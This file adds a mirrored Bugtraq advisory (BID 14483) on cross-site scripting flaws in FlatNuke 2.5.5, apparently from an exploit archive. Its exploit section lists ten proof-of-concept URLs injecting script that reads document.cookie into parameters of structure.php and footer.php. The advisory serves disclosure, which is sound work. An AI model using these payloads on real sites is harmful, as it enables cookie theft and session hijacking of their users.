@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid14483<p><b><span style="font-size: 18pt;">FlatNuke Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14483/info">info</a><br><a href="http://www.securityfocus.com/bid/14483/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14483/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14483/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14483/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14483
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 05 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 05 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				rgod is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					FlatNuke FlatNuke 2.5.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>Examples have been provided:<br/><br/>(1) cross site scripting:<br/>http://target/path/themes/butterfly/structure.php?bodycolor="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/themes/butterfly/structure.php?backimage="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/themes/butterfly/structure.php?backimage=whatever&amp;theme="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/themes/butterfly/structure.php?backimage=whatever&amp;bodycolor="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/themes/butterfly/structure.php?logo="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/><br/>(2) if register_globals in php.ini are off (often), cross site scripting:<br/><br/>http://target/path/forum/footer.php?admin="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/forum/footer.php?admin_mail="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/forum/footer.php?back="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/footer.php?admin="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br/>http://target/path/footer.php?admin_mail="&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
